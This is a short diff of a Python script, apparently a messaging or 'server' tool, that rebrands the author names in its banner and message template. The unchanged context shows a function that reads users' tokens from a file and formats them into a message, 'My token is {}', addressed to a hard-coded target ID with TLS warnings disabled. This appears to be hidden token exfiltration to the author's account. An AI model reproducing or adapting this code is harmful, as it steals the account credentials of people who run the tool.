@@ -39,7 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello WiNe  papa g! I am using your server. My token is {}"
+      msg_template = "Hello MONXTER Papa! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
       target_id = "61556456204355"
@@ -47,7 +47,7 @@ def send_initial_message():
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•────────────────────── TRICKS BY EVIL ───────────────────────────────•')
+          print('\033[1;92m' + '•────────────────────── TRICKS BY MONXTER ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
